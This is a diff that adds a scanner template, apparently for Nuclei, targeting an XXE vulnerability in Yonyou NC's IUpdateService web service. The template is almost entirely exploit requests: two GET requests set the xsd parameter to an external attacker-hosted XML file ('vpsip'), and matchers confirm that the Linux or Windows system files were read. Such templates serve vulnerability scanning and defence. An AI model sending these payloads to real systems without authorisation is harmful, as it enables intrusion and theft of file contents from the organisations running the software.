@@ -1,0 +1,23 @@
+id: yongyouNC-IUpdateService-xxe
+
+info:
+  name: yongyouNC-IUpdateService-xxe
+  author: xiaokp7
+  severity: high
+  description: 用友NC IUpdateService存在XXE漏洞
+
+http:
+  - raw:
+      - |              
+        GET /uapws/service/nc.uap.oba.update.IUpdateService?xsd=http://vpsip/linux.xml HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        GET /uapws/service/nc.uap.oba.update.IUpdateService?xsd=http://vpsip/windows.xml HTTP/1.1
+        Host: {{Hostname}}
+               
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code==200 && contains_all(body_1,"root")'
+          - 'status_code==200 && contains_all(body_2,"fonts")'
